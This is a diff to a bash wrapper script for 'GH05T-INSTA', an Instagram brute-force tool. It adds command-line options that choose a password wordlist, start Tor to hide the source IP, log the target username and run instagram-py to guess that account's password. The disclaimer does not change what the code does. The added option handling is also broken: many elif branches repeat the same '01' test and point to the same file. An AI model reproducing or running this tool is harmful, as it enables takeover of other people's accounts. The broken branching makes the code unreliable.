@@ -1,5 +1,55 @@
 #!/bin/env bash
 
+readthisone() {
+	echo ""
+	echo "######################################################"
+	echo "######################################################"
+	echo "##################### READ THIS ######################"
+	echo "######################################################"
+	echo "######################################################"
+	echo "## Dear GitHub user, please do not copy this script ##"
+	echo "######################################################"
+	echo "##  All copyright under the laws of all countries   ##"
+	echo "######################################################"
+	echo "##        Copyright of  GH05T HUNTER5, 2023         ##"
+	echo "######################################################"
+	echo "######################################################"
+	
+	
+	
+	echo "#######################################################################################"
+	echo "#######################################################################################"
+	echo "##   GH05T-INSTA 	: 	Insta BruteForce Tool         			           ##"
+	echo "##   Authors 		: 	GH05T-HUNTER5				           ##"
+	echo "##   Version 		: 	7.01			                           ##"
+	echo "##   Github 		: 	https://github.com/GH05T-HUNTER5/GH05T-INSTA       ##"
+	echo "#######################################################################################"
+	echo "##  MIT License 				                                           ##"
+	echo "##								                   ##"
+	echo "##  Copyright (c) 2023 GH05T HUNTER5 						   ##"
+	echo "##										   ##"
+	echo "##  Permission is hereby granted, free of charge, to any person obtaining a copy     ##"
+	echo "##  of this software and associated documentation files (the "Software"), to deal    ##"
+	echo "##  in the Software without restriction, including without limitation the rights     ##"
+	echo "##  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell        ##"
+	echo "##  copies of the Software, and to permit persons to whom the Software is            ##"
+	echo "##  furnished to do so, subject to the following conditions:                         ##"
+	echo "##                                                                                   ##"
+	echo "##  The above copyright notice and this permission notice shall be included in all   ##"
+	echo "##  copies or substantial portions of the Software.                                  ##"
+	echo "##  										   ##"
+	echo "##  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR       ##"
+	echo "##  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,         ##"
+	echo "##  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE      ##"
+	echo "##  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER           ##"
+	echo "##  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,    ##"
+	echo "##  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE    ##"
+	echo "##  SOFTWARE.          								   ##"
+	echo "#######################################################################################"
+	echo "#######################################################################################"	
+}
+
+
 reset='\033[0m'
 exit_on_signal_SIGINT() {
 echo ""
@@ -291,7 +341,6 @@ cookies_users(){
 	else
 		echo "History not found"
 		sleep 2
-		main_menu
 	fi
 }
 
@@ -344,6 +393,7 @@ main_menu() {
 		insta_report
 	elif [ $option = "05" ] || [ $option = "5" ]; then
 		cookies_users
+		main_menu
 	elif [ $option = "06" ] || [ $option = "6" ]; then
 		main_install
 		install_tool
@@ -373,6 +423,159 @@ insta_report() {
 	exit
 }
 
-
-
+if [ $3 = "--pass" ] >/dev/null 2>&1
+then
+	if [ $1 = "--user" ]; then
+		clear
+		if [ -z $4 ]; then
+			clear
+			echo " choose password option"
+			exit
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-1.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-2.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ] || [ $4 = "1" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then 
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then
+			passwordtype="/usr/cookies/password-19.txt"
+		elif [ $4 = "01" ]; then		
+			passwordtype="/usr/cookies/password-19.txt"
+		else
+			clear
+			echo " choose password option"
+			exit
+		fi
+		brutejson
+		tornotice
+		tor > /dev/null 2>&1 &
+		clear
+		echo "User : $2" >> /usr/cookies/history.txt
+		echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
+		instagram-py --username $2 --password-list $passwordtype
+		reopens
+		sleep 3
+		echo -e " \033[1;37m +----------------------------------------------+"
+		echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 3.01\033[1;37m|"
+		echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 2.07\033[1;37m|"
+		echo -e " \033[1;37m +----------------------------------------------+"
+		echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
+		echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
+		echo -e " \033[1;37m |   Never use this tool to do illegal things   |"
+		echo -e " \033[1;37m +----------------------------------------------+"
+		sleep 10
+		exit
+		else
+			echo " Something Wrong"
+		fi
+		elif [ $3 = "--passadd" ] >/dev/null 2>&1
+		then
+			echo ""
+		if [ $1 = "--user" ]; then
+			echo ""
+			brutejson
+			tornotice
+			tor > /dev/null 2>&1 &
+			clear
+			echo "User : $username" >> /usr/cookies/history.txt
+			echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
+			instagram-py --username $username --password-list $passnum
+			reopens
+			sleep 3
+			echo -e " \033[1;37m +----------------------------------------------+"
+			echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 3.01\033[1;37m|"
+			echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 2.07\033[1;37m|"
+			echo -e " \033[1;37m +----------------------------------------------+"
+			echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
+			echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
+			echo -e " \033[1;37m |   Never use this tool to do illegal things   |"				
+			echo -e " \033[1;37m +----------------------------------------------+"
+			sleep 10
+			exit
+		else
+		clear
+		echo " Something Wrong"
+		exit
+		fi
+		elif [ $1 = "--help" ] >/dev/null 2>&1
+		then
+			echo ""
+			clear
+			gh05t_help
+		exit
+		elif [ $1 = "--update" ] >/dev/null 2>&1
+		then
+			echo ""
+			clear
+			check_updates
+		exit
+		elif [ $1 = "--check" ] >/dev/null 2>&1
+		then
+			echo ""
+			clear
+			main_install
+			install_tool
+			check_updates
+		exit
+		elif [ $1 = "--history" ] >/dev/null 2>&1
+		then
+			echo ""
+			clear
+			cookies_users
+		exit
+		elif [ $1 = "uninstall" ] >/dev/null 2>&1
+		then
+			echo ""
+			clear
+		if [ $2 = "all" ]; then
+			echo ""
+			clear
+			ghost_uninstall
+		else
+			clear
+			echo " Try Again"
+			sleep 4
+			clear
+			echo ""
+		exit
+		fi
+			echo ""
+		else
+			echo ""
+			clear 
+		fi
+		clear
+		
 main_menu
